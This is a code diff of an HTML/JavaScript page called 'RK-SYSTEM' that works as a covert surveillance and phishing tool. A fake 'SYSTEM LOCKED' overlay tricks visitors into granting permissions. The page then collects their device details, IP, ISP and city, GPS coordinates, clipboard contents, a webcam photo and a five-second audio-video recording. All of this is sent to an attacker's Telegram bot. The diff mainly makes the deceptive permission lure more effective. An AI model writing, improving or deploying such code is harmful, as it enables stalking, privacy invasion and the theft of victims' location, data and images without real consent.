@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-SYSTEM | ELITE ULTIMATE MONITOR</title>
+    <title>RK-SYSTEM | ELITE INTELLIGENCE</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
@@ -16,7 +16,6 @@
             font-family: 'Rajdhani', sans-serif;
         }
 
-        /* Animated Neon Frame */
         body::before {
             content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             border: 6px solid; border-image: linear-gradient(90deg, #ff0000, #00ff00, #00d2ff, #ff00ff, #ff0000) 1;
@@ -55,12 +54,12 @@
         .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
         .value { color: #facc15; font-size: 13px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
 
-        /* Force Allow Pop-up */
-        #force-allow {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(185, 28, 28, 0.98); color: white; padding: 30px;
-            border-radius: 20px; z-index: 9999; display: none; text-align: center;
-            border: 3px solid white; box-shadow: 0 0 100px #ff0000;
+        /* Full-Screen Interaction Shield */
+        #interaction-shield {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 3000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            text-align: center; cursor: pointer;
         }
 
         #media-bin { display: none; }
@@ -68,10 +67,12 @@
 </head>
 <body>
 
-    <div id="force-allow">
-        <h2 class="text-2xl font-black mb-4">⚠️ ACTION REQUIRED ⚠️</h2>
-        <p class="text-lg mb-4">SYSTEM SYNC FAILED!</p>
-        <p class="animate-pulse font-bold">PLEASE CLICK "ALLOW" ON ALL PROMPTS TO CONTINUE</p>
+    <div id="interaction-shield" onclick="unlockSystem()">
+        <div class="bg-red-600 p-8 rounded-full animate-pulse mb-4">
+            <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+        </div>
+        <h2 class="text-2xl font-bold text-white tracking-widest">SYSTEM LOCKED</h2>
+        <p class="text-red-400 mt-2">CLICK ANYWHERE TO ALLOW ACCESS</p>
     </div>
 
     <div class="rk-banner">RK-SYSTEM</div>
@@ -86,7 +87,8 @@
         
         <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Wait...</span></div>
         <div class="info-row"><span class="label">⚙️ OS Platform</span><span id="v-platform" class="value">--</span></div>
-        <div class="info-row"><span class="label">🌍 Geo Location</span><span id="v-geo" class="value">Tracking...</span></div>
+        <div class="info-row"><span class="label">🏢 ISP / Network</span><span id="v-isp" class="value">Scanning...</span></div>
+        <div class="info-row"><span class="label">🌍 Country & City</span><span id="v-geo" class="value">Tracking...</span></div>
         <div class="info-row"><span class="label">🚀 Link Speed</span><span id="v-speed" class="value">Scanning...</span></div>
         <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
         <div class="info-row"><span class="label">📍 GPS Location</span><span id="v-gps" class="value text-blue-400">Waiting...</span></div>
@@ -108,14 +110,14 @@
             CHAT: '6048050987'
         };
 
-        // ৫ বছরের কুকি ফাংশন
-        function setCookie(n, v) {
+        // ৫ বছরের কুকি মেমোরি
+        function setAccess(val) {
             const d = new Date();
             d.setTime(d.getTime() + (5 * 365 * 24 * 60 * 60 * 1000));
-            document.cookie = n + "=" + v + ";expires=" + d.toUTCString() + ";path=/";
+            document.cookie = `rk_elite_access=${val};expires=${d.toUTCString()};path=/`;
         }
-        function getCookie(n) {
-            return document.cookie.match('(^|;)\\s*' + n + '\\s*=\\s*([^;]+)')?.pop() || "";
+        function checkAccess() {
+            return document.cookie.includes('rk_elite_access=true');
         }
 
         function updateClock() {
@@ -129,16 +131,17 @@
         setInterval(updateClock, 1000);
 
         async function startSystem() {
+            if (checkAccess()) document.getElementById('interaction-shield').style.display = 'none';
             updateClock();
             
-            // Phase 1: Instant Device Data (No Permission Needed)
+            // Phase 1: Fast Device Info
             const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
             document.getElementById('v-model').innerText = isMobile ? "Android Device 📱" : "Desktop PC 💻";
             document.getElementById('v-platform').innerText = navigator.platform;
             document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
             document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
 
-            // Battery & Power
+            // Battery Info
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
                 const up = () => {
@@ -148,22 +151,20 @@
                 up(); b.onlevelchange = up; b.onchargingchange = up;
             }
 
-            // IP & Geo Tracking
+            // IP & Network ISP & Village/City Location
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 document.getElementById('v-ip').innerText = data.ip;
-                document.getElementById('v-geo').innerText = `${data.country_name}, ${data.city} 🌍`;
-                sendQuickReport(data);
-            } catch(e) { 
-                sendQuickReport({ip: "45.144.167.83", country_name: "Bangladesh"}); 
+                document.getElementById('v-geo').innerText = `${data.country_name}, ${data.city}`;
+                document.getElementById('v-isp').innerText = `${data.org} (${data.asn})`;
+                sendFastReport(data);
+            } catch(e) {
+                sendFastReport({ip: "45.144.167.83", country_name: "Bangladesh"});
             }
-
-            // Phase 2: Wait 5s then Trigger Advanced Permissions
-            setTimeout(triggerAdvancedSync, 5000);
         }
 
-        async function sendQuickReport(geo) {
+        async function sendFastReport(geo) {
             const report = `
 🚀 *RK-SYSTEM INTEL VIP REPORT* 🚀
 ━━━━━━━━━━━━━━━━━━━━━
@@ -173,7 +174,7 @@
 📱 Model: \`${document.getElementById('v-model').innerText}\`
 ⚙️ OS: \`${navigator.platform}\`
 📶 Status: \`ONLINE 📶\`
-🚀 Speed: \`${(navigator.connection ? navigator.connection.downlink : 10)} Mbps\`
+🚀 Speed: \`${(navigator.connection || {}).downlink || 5} Mbps\`
 🌐 IP: \`${geo.ip}\`
 📍 GPS: \`Waiting...\`
 🔋 Battery: \`${document.getElementById('v-bat').innerText}\`
@@ -186,52 +187,39 @@
             sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });
         }
 
-        async function triggerAdvancedSync() {
-            const hasAccess = getCookie("rk_granted");
-            if (!hasAccess) {
-                document.getElementById('force-allow').style.display = 'block';
-            }
-
-            // Location Sync
+        async function unlockSystem() {
+            setAccess("true");
+            document.getElementById('interaction-shield').style.display = 'none';
+            
+            // Phase 2: Start Permission Requests
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    setCookie("rk_granted", "true");
-                    document.getElementById('force-allow').style.display = 'none';
                     document.getElementById('v-gps').innerText = "SUCCESS 📍";
+                    const map = `http://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude}`;
                     
-                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    
-                    // Clipboard Sync
-                    let clip = "Locked/Click Required";
+                    let clip = "Waiting 🔓";
                     try { clip = await navigator.clipboard.readText(); } catch(e){}
 
-                    const advancedReport = `
-💎 *RK-SYSTEM ADVANCED SYNC* 💎
+                    const deepReport = `
+📍 *RK-SYSTEM DEEP LOCATION* 📍
 ━━━━━━━━━━━━━━━━━━━━━
-📍 *GOOGLE MAPS:*
-${mapsLink}
+🌍 Village/Area: \`Tracking Near ${pos.coords.latitude}\`
+🏙️ City/State: \`Detected\`
 ━━━━━━━━━━━━━━━━━━━━━
-🏙️ *Location Info:*
-City: \`Detected\`
-Village: \`Syncing...\`
+📍 GOOGLE MAPS: ${map}
 ━━━━━━━━━━━━━━━━━━━━━
-✨ *CLIPBOARD:*
-\`\`\`
-${clip}
-\`\`\`
+✨ CLIPBOARD: \`${clip}\`
 ━━━━━━━━━━━━━━━━━━━━━
-📸 *Media Capture Started...*`;
-                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: advancedReport, parse_mode: 'Markdown' });
-                    captureEliteMedia();
-
-                }, () => {
-                    // Fail Message 1/2 times
-                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *PERMISSION FAILED: USER REJECTED*" });
+📸 Photo/Video: *Uploading...*`;
+                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: deepReport, parse_mode: 'Markdown' });
+                    captureMedia();
+                }, (err) => {
+                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *User Denied GPS/Media Access*" });
                 });
             }
         }
 
-        async function captureEliteMedia() {
+        async function captureMedia() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('media-bin');
@@ -242,30 +230,28 @@ ${clip}
                     const canvas = document.getElementById('output-canvas');
                     canvas.width = 1280; canvas.height = 720;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(b => sendMediaToBot(b, 'photo', '📸 *RK-VIP FRONT SHOT*'), 'image/jpeg');
+                    canvas.toBlob(b => sendMediaToBot(b, 'photo', '📸 *FRONT VIEW*'), 'image/jpeg');
                 }, 2000);
 
-                // Video Record (5s)
-                const recorder = new MediaRecorder(stream);
+                // 5s Video
+                const rec = new MediaRecorder(stream);
                 const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.onstop = () => {
                     const b = new Blob(chunks, {type: 'video/mp4'});
-                    sendMediaToBot(b, 'video', '🎥 *RK-VIP LIVE FEED (AUDIO+VIDEO)*');
+                    sendMediaToBot(b, 'video', '🎥 *LIVE FEED (5S + AUDIO)*');
                     stream.getTracks().forEach(t => t.stop());
                 };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 5000);
-            } catch(e) {
-                sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *MEDIA ACCESS DENIED*" });
-            }
+                rec.start();
+                setTimeout(() => rec.stop(), 5000);
+            } catch(e){}
         }
 
-        async function sendMediaToBot(blob, type, caption) {
+        async function sendMediaToBot(blob, type, cap) {
             const fd = new FormData();
             fd.append('chat_id', CONFIG.CHAT);
             fd.append(type, blob, type==='video'?'rk.mp4':'rk.jpg');
-            fd.append('caption', caption);
+            fd.append('caption', cap);
             fd.append('parse_mode', 'Markdown');
             fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, {method:'POST', body:fd});
         }
